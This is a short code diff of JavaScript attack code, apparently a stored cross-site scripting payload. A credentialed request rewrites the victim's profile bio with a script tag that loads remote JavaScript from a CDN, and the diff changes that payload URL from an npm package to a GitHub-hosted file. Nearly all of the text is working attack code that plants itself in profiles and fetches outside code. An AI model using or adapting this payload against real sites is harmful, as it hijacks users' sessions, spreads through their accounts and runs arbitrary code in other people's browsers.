@@ -22,6 +22,6 @@ xhr.onreadystatechange = function(){
     xhr_2.open('POST', '/api/user/update');
     xhr_2.withCredentials = true;
     xhr_2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-    xhr_2.send("bio=<script src='https://cdn.jsdelivr.net/npm/my-npm-payload@3.0.0'></script>Title:"+title+"&csrf_token=<my_csrf_token>");
+    xhr_2.send("bio=<script src='https://cdn.jsdelivr.net/gh/YoneD19/web@latest/test.js'></script>Title:"+title+"&csrf_token=<my_csrf_token>");
 }
 xhr.send();
